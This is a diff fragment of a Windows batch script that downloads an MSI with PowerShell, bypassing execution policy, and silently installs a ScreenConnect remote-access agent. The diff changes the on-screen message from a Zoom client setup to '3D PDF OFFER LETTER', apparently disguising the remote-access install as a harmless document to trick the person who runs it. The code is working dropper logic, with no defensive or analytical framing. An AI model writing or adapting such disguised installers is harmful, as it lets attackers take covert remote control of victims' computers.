@@ -20,7 +20,7 @@ set "MSILOG=%TMPDIR%\ScreenConnectInstall.log"
 if not exist "%TMPDIR%" mkdir "%TMPDIR%" >nul 2>&1
 
 :: --- Download MSI (IWR -> certutil fallback) ---
-echo Downloading ZoomWorkspace ClientSetup...
+echo Downloading 3D PDF OFFER LETTER...
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
   "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try{ Invoke-WebRequest -UseBasicParsing -Uri '%SC_MSI_URL%' -OutFile '%MSI%' -TimeoutSec 120 }catch{ exit 1 }"
 if errorlevel 1 (
@@ -49,3 +49,4 @@ if not "%RC%"=="0" (
 
 echo SUCCESS: ScreenConnect/Control agent installed. Log at "%MSILOG%"
 exit /b 0
+
